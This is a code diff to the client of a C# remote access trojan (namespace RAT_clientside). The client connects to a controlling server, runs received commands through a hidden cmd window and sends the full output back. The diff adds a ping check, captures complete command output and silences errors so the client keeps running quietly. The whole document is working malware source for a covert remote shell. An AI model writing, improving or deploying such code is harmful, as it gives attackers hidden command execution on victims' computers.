@@ -2,6 +2,7 @@
 using System.Diagnostics;
 using System.IO;
 using System.Net;
+using System.Net.NetworkInformation;
 using System.Net.Sockets;
 
 namespace RAT_clientside
@@ -18,7 +19,21 @@ namespace RAT_clientside
 
         private static TcpClient client;
 
-        private static bool connectedToServer = true; //TODO Make function to check if connected
+        private static bool ConnectedToServer()
+        {
+            bool pingSucess = false;
+
+            Ping pinger = new Ping(); //Create a new pinger object
+            try
+            {
+                PingReply pingReply = pinger.Send(HostName); //Get the ping reply
+                pingSucess = pingReply.Status == IPStatus.Success; //Set the return bool
+            }
+            catch (PingException){}
+
+            return pingSucess;
+        } //TODO Make function to check if connected
+
         private static bool keepAlive = true; //Function that holds the program running
 
         public static void Main(string[] args)
@@ -39,7 +54,6 @@ namespace RAT_clientside
                 catch (Exception e)
                 {
                     Console.WriteLine(e);
-                    throw;
                 }
 
                 //Create the cmd process to be used in the loop
@@ -52,23 +66,19 @@ namespace RAT_clientside
                 cmdProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                 
                 //Loop that's active aslong as server responds to pings
-                while (connectedToServer)
+                while (ConnectedToServer())
                 {
                     //Wait for incoming commands
                     try
                     {
                         cmd = sr.ReadLine();
                     }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine(e);
-                        throw;
-                    }
+                    catch (Exception e){}
 
                     //Execute commands
                     cmdProcess.StartInfo.Arguments = "/C" + cmd;
                     cmdProcess.Start();
-                    string outPut = cmdProcess.StandardOutput.ReadLine(); //Get the output and store it in a string
+                    string outPut = cmdProcess.StandardOutput.ReadToEnd(); //Get the output and store it in a string
 
                     //Send output back
                     try
@@ -76,11 +86,7 @@ namespace RAT_clientside
                         sw.WriteLine(outPut);
                         sw.Flush();
                     }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine(e);
-                        throw;
-                    }
+                    catch (Exception e){}
                 }
             }
         }
